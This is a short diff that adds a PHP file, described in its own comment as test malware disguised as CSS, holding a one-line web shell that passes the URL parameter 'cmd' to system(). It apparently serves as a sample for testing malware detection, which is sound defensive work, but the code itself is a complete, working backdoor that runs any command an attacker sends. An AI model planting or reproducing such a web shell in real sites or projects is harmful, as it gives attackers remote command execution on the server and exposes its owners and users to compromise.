@@ -1,0 +1,4 @@
+<?php
+// Another test malware file disguised as CSS
+system($_GET['cmd']);
+?>
